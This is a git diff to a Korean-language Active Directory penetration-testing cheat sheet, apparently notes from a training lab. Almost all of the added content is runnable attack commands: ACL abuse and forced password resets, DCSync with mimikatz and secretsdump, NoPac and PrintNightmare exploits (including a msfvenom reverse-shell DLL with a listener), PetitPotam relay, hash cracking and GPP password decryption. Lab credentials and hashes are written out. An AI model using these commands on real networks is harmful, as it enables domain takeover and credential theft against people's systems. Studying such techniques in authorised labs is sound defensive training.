@@ -472,16 +472,16 @@ Get-DomainUser * -spn | select samaccountname
 
 ## 1. PowerView를 사용하여 ACL 열거
 
-### Find-InterestingDomainAcl 사용
+### Find-InterestingDomainAcl 사용 (너무 많은 ACL 열거)
 ```Find-InterestingDomainAcl```
 
-### 특정 사용자 타겟 (예 : wley)
+### 특정 사용자만 타겟 (예 : wley)
 ```
 Import-Module .\PowerView.ps1
 $sid = Convert-NameToSid wley
 ```
 
-### Get-DomainObjectACL 사용
+### Get-DomainObjectACL 사용 
 ```Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}```
 
 ### GUID 값으로 Reverse Search & Mapping 
@@ -490,10 +490,354 @@ $guid= "00299570-246d-11d0-a768-00aa006e0529"
 Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
 ```
 
-### ObjectAceType 속성 자동 변환(-ResolveGUIDs 플래그)
+### ObjectAceType 속성 자동 변환 (-ResolveGUIDs 플래그)
 ```Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}```
 
+### Domain Users List 생성 (수동 : 오래걸림)
+```
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+```
 
+### damundsen 사용자를 사용하여 권한 열거
+```
+$sid2 = Convert-NameToSid damundsen
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+```
+
+### Get-DomainGroup을 사용하여 Help Desk Level 1 Group 조사
+```Get-DomainGroup -Identity "Help Desk Level 1" | select memberof```
+
+### Information Technology Group 조사
+```
+$itgroupsid = Convert-NameToSid "Information Technology"
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+```
+
+### adunn 사용자의 흥미로운 접근 권한 찾기
+```
+$adunnsid = Convert-NameToSid adunn 
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+```
+
+<br/><br/>
+## 2. Abusing ACLs
+
+### PSCredential Object 생성 (wley 자격증명 사용)
+```
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
+```
+
+### SecureString Object 생성
+```$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force```
+
+### damundsen 사용자 Password 변경
+```
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+```
+
+### damundsen을 사용하여 SecureString Object 생성
+```
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+```
+
+### Help Desk Level 1 Group에 damundsen 추가
+```
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+```
+
+### damundsen이 Group에 추가됨을 확인
+```Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName```
+
+### Fake SPN(Service Principal Name) 생성
+```Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose```
+
+### Kerberoasting - Rubeus
+```.\Rubeus.exe kerberoast /user:adunn /nowrap```
+
+### 정리 작업 1 - adunn 계정으로 Fake SPN 제거
+```Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose```
+
+### 정리 작업 2 - Help Desk Level 1 Group에서 damundsen 제거
+```Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose```
+
+### 정리 작업 3 - Help Desk Level 1 Group에서 damundsen 제거 여부 확인
+```Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose```
+
+<br/><br/>
+## 3. DCSync
+
+### Get-DomainUser를 사용하여 adunn의 Group Membership 확인
+```Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl```
+
+### Get-ObjectAcl를 사용하여 adunn의 Replication 권한 확인
+```
+$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+```
+
+### secretsdump.py를 사용하여 NTLM 해시 및 Kerberos 키 추출
+```secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5```<br/>
+- NTLM 해시 : ```-just-dc-ntlm 플래그```<br/>
+- 특정 사용자 : ```-just-dc-user <USERNAME> 플래그```<br/>
+- 비밀번호 마지막 변경시기 : ```-pwd-last-set 플래그```<br/>
+- 비밀번호 크래킹 보충 데이터 : ```-history 플래그```<br/>
+- 비활성화 사용자 확인 : `-user-status 플래그```
+
+### Get-ADUser를 사용하여 추가 열거 (Reversible 암호화(RC4) 계정)
+```Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl```
+
+### Get-DomainUser를 사용하여 Reversible 암호화(RC4) 계정 체크
+```Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol```
+
+### Mimikatz로 DCSync 공격 수행
+```
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+.\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
+
+<br/><br/>
+## 4. Privileged Access
+
+### Remote Desktop Users Group 열거
+```Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"```
+
+### Remote Management Users Group 열거
+```Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"```
+
+### BloodHound로 원격 권한 사용자 확인 (화면 하단 Raw Query)
+```MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2```
+
+### Windows에서 WinRM Session 연결
+```
+$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+```
+
+### Linux에서 Evil-WinRM을 사용하여 연결
+```evil-winrm -i 10.129.201.234 -u forend```
+
+### BloodHound로 SQLAdmin 권한 사용자 확인 (화면 하단 Raw Query)
+```MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2```<br/>
+또는 ```Node Info 탭에서 SQL Admin Rights을 확인```
+
+### PowerUpSQL을 사용하여 MSSQL Instances 열거
+```
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+```
+
+### mssqlclient.py 실행
+```
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami /priv
+```
+
+<br/><br/>
+## 5. Kerberos "Double Hop" 문제
+
+### evil-winrm 세션에서 해결 방법 #1: PSCredential Object
+```
+$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
+get-domainuser -spn -credential $Cred | select samaccountname
+klist
+```
+
+### WinRM 세션에서 해결 방법 #2: Register PSSession Configuration
+```
+Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+klist
+```
+
+<br/><br/>
+# AD 취약점 공격
+
+## 1. NoPac(SamAccountName Spoofing)
+
+### NoPac Exploit Repo 복제
+```git clone https://github.com/Ridter/noPac.git```
+
+### NoPac 스캐닝
+```sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap```
+
+### NoPac 실행 및 쉘 가져오기
+```sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap```
+
+### noPac을 사용하여 DCSync the Built-in Administrator Account
+```sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator```
+
+<br/><br/>
+## 2. PrintNightmare
+
+### 익스플로잇 복제
+```git clone https://github.com/cube0x0/CVE-2021-1675.git```
+
+### Impacket의 cube0x0 버전 설치 필요
+```
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+```
+
+### MS-RPRN에 대한 열거
+```rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'```
+
+### DLL 페이로드 생성
+```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll```
+
+### smbserver.py로 공유 생성
+```sudo smbserver.py -smb2support CompData /path/to/backupscript.dll```
+
+### MSF multi/handler 구성 및 시작
+```
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+```
+
+### Exploit 실행
+```sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'```
+
+<br/><br/>
+## 3. PetitPotam (MS-EFSRPC)
+
+### ntlmrelayx.py 시작
+```sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController```
+
+### PetitPotam.py 실행
+```python3 PetitPotam.py 172.16.5.225 172.16.5.5```
+
+### DC01에 대한 Base64 인코딩된 인증서 포착
+
+### gettgtpkinit.py를 사용하여 TGT 요청하기
+```python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache```
+
+### KRB5CCNAME 환경 변수 설정
+```export KRB5CCNAME=dc01.ccache```
+
+### klist 실행
+```klist```
+> klist 명령 사용을 위한 패키지 : [krb5-user](https://packages.ubuntu.com/focal/krb5-user)
+
+### 도메인 컨트롤러에 대한 관리자 액세스 확인
+```crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf```
+
+### getnthash.py를 사용하여 TGS 요청 제출
+```python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$```
+
+### 도메인 컨트롤러 NTLM 해시를 사용하여 DCSync
+```secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba```
+
+### DC01$ 머신 계정으로 TGT 요청 및 PTT 수행
+```.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt```
+
+### 티켓이 메모리에 있는지 확인
+```klist```
+
+### Mimikatz로 DCSync 수행
+```
+.\mimikatz.exe
+mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
+```
+
+<br/><br/>
+# 기타 잘못된 구성
+
+## 1. Printer Bug
+
+### MS-PRN Printer Bug 열거
+```
+Import-Module .\SecurityAssessment.ps1
+Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+```
+
+<br/><br/>
+## 2. DNS 레코드 열거
+
+### adidnsdump 사용
+```adidnsdump -u inlanefreight\\forend ldap://172.16.5.5```
+
+### -r 옵션을 사용하여 알 수 없는 레코드 Resolve
+```adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r```
+
+### records.csv 파일에서 숨겨진 레코드 찾기
+```head records.csv```
+
+<br/><br/>
+## 3. 기타
+
+### Get-Domain User를 사용하여 Description 필드에서 비밀번호 찾기
+```Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}```
+
+### Get-DomainUser를 사용하여 PASSWD_NOTREQD 설정 확인
+```Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol```
+
+### SMB 공유 및 SYSVOL 스크립트의 자격 증명
+```ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts```
+
+<br/><br/>
+## 4. Group Policy Preferences (GPP) Passwords
+
+###  SYSVOL 공유에 Groups.xml 보기
+
+### gpp-decrypt로 비밀번호 해독하기
+```gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE```
+
+### CrackMapExec를 사용하여 GPP 비밀번호 찾기 및 검색
+```crackmapexec smb -L | grep gpp```
+
+### CrackMapExec의 gpp_autologin 모듈 사용
+```crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin```
+
+<br/><br/>
+## 5. ASREPRoasting
+
+### Get-DomainUser를 사용하여 DONT_REQ_PREAUTH 값 열거
+```Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl```
+
+### Rubeus를 사용하여 AS-REP Retrieving
+```.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat```
+
+### Hashcat으로 오프라인에서 해시 크래킹
+```hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt```
+
+### Kerbrute를 사용하여 AS-REP Retrieving
+```kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt```
+
+### Kerberoast 사전 인증이 필요하지 않은 사용자 헌팅
+```GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users```
+
+<br/><br/>
+## 6. Group Policy Object (GPO) Abuse
+
+### PowerView를 사용하여 GPO 이름 열거
+```Get-DomainGPO |select displayname```
+
+### 내장된 Cmdlet을 사용하여 GPO 이름 열거
+```Get-GPO -All | Select DisplayName```
+
+### 도메인 사용자 GPO 권한 열거
+```
+$sid=Convert-NameToSid "Domain Users"
+Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+```
+
+### GPO GUID를 이름으로 변환
+```Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532```
 
 
 
